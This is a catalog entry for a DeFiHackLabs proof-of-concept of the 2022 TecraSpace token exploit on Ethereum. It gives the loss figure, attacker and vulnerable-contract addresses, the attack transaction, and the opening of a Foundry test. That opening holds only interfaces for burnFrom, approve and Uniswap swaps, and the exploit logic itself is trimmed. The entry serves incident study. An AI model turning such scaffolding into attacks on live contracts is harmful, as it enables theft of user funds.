# [?] TecraSpace - Any token is destroyed

## Summary
Severity: Unknown
Chain: Ethereum
Component: TecraSpace
Published: 2022-02-04
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-02/TecraSpace_exp.sol
Type: defi-exploit-poc

## Details
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

/*
    @KeyInfo
    - Total Lost: 639,222 $USDT
    - Attacker: https://etherscan.io/address/0xb19b7f59c08ea447f82b587c058ecbf5fde9c299
    - Attack Contract: https://etherscan.io/address/0x6653d9bcbc28fc5a2f5fb5650af8f2b2e1695a15
    - Vuln Contract: https://etherscan.io/address/0xe38b72d6595fd3885d1d2f770aa23e94757f91a1
    - Attack Tx: https://app.blocksec.com/explorer/tx/eth/0x81e9918e248d14d78ff7b697355fd9f456c6d7881486ed14fdfb69db16631154
*/
interface IUSDTInterface {
    function approve(address spender, uint256 value) external;
}

interface ITcrInterface {
    function burnFrom(address from, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
}

interface IUNIswapV2 {
    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-02/TecraSpace_exp.sol_
